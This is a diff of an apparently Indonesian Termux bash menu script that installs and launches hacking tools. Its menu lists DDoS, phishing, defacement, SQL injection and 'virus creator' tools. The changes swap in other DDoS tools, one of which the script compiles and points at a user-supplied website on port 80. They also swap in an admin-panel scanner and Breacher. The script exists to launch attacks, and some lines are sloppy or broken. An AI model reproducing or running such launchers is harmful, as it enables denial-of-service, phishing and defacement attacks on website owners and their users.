@@ -37,13 +37,13 @@ echo "\033[36;1m"
 echo "#####################################################"
 echo $red"  [1] BLACK HYDRA                              "
 echo "#####################################################"
-echo $white"  [2] LITEDDOS                               "
+echo $white"  [2] DDOS ACT                               "
 echo "#####################################################"
 echo $purple"  [3] LAZYMUX                               "
 echo "#####################################################"
 echo $cyan"  [4] AOC DEFACE                              "
 echo "#####################################################"
-echo $green"  [5] DDOS HAMMER                            "
+echo $green"  [5] DDOS XERXES                            "
 echo "#####################################################"
 echo $yellow"  [6] SHELPHISH                             "
 echo "#####################################################"
@@ -55,7 +55,7 @@ echo $purple"  [9] TXTOOL                                "
 echo "#####################################################"
 echo $cyan"  [10] SQLMAP                                 "
 echo "#####################################################"
-echo $green"  [11] SPAM WHATSAPP                         "
+echo $green"  [11] ADMIN LOGIN                         "
 echo "#####################################################"
 echo $yellow"  [12] CREATER VIRUS                        "
 echo "#####################################################"
@@ -115,14 +115,18 @@ echo -e  "Contact  : 085726833815
 echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
 echo -e  "#############################################################"
 sleep 1
-echo $green"Installing LITEDDOS..."
+echo $green"Installing DDOS ACT..."
 sleep 1
-apt update
+apt update && apt upgrade
+apt install python
+apt install python-pip
+apt install install python-dev
 apt install git
-git clone https://github.com/4L13199/LITEDDOS
-mv LITEDDOS $HOME
-cd $HOME/LITEDDOS
-python2 LITEDDOS.py
+git clone https://github.com/rootnet007/ddos.git
+mv ddos $HOME
+cd $HOME/ddos
+chmod +x dos.py
+python dos.py
 fi
 
 if [ $bro = 3 ] || [ $bro = 3 ]
@@ -192,12 +196,18 @@ echo -e  "Contact  : 085726833815
 echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
 echo -e  "#############################################################"
 sleep 1
-echo $green" Installing Hammer DDOS.."
+echo $green" Installing DDOS XERXES.."
 sleep 1
-git clone http://github.com/cyweb/hammer
-mv hammer $HOME
-cd $HOME/hammer
-python2 hammer.py
+apt update && apt upgrade
+apt install git
+apt install clang
+git clone https://github.com/zanyarjamal/xerxes
+mv xerxes $HOME
+cd $HOME/xerxes
+clang xerxes.c -o xerxes
+clear
+read -p "[masukanWebsiteTarget]>" target
+./xerxes target 80
 fi
 
 if [ $bro = 6 ] || [ $bro = 6 ]
@@ -346,15 +356,12 @@ echo -e  "Contact  : 085726833815
 echo -e  "Blog     : https://cybernoobstayupati.blogspot.com/
 echo -e  "#############################################################"
 sleep 1
-echo $green"Installing Spam Wa..."
+echo $green"Installing ADMIN LOGIN..."
 sleep 1
-apt update && apt upgrade
-apt install git
-apt install php
-git clone https://github.com/siputra12/prank/
-mv prank $HOME
-cd $HOME/prank
-php wa.php
+git clone https://github.com/DarknessCyberTeam/Scan-Website-Admin-Login
+mv Scan-Website-Admin-Login $HOME
+cd $HOME/Scan-Website-Admin-Login
+python2 Admin-Login.py
 fi
 
 if [ $bro = 12  || [ $bro = 12 ]
@@ -374,12 +381,12 @@ echo -e  "#############################################################"
 sleep 1
 echo $green"Installing CREATER VIRUS..."
 sleep 1
+pkg install python2
 pkg install git
-pip2 install mechanize
-git clone https://github.com/virus09/CreaterVirus.git
-mv CreaterVirus $HOME
-cd $HOME/CreaterVirus
-python2 creater.py
+git clone https://github.com/UltimateHackers/Breacher.git
+mv Breacher $HOME
+cd $HOME/Breacher
+python2 breacher.py
 fi
 
 if [ $bro = 13 ] || [ $bro = 13 ]
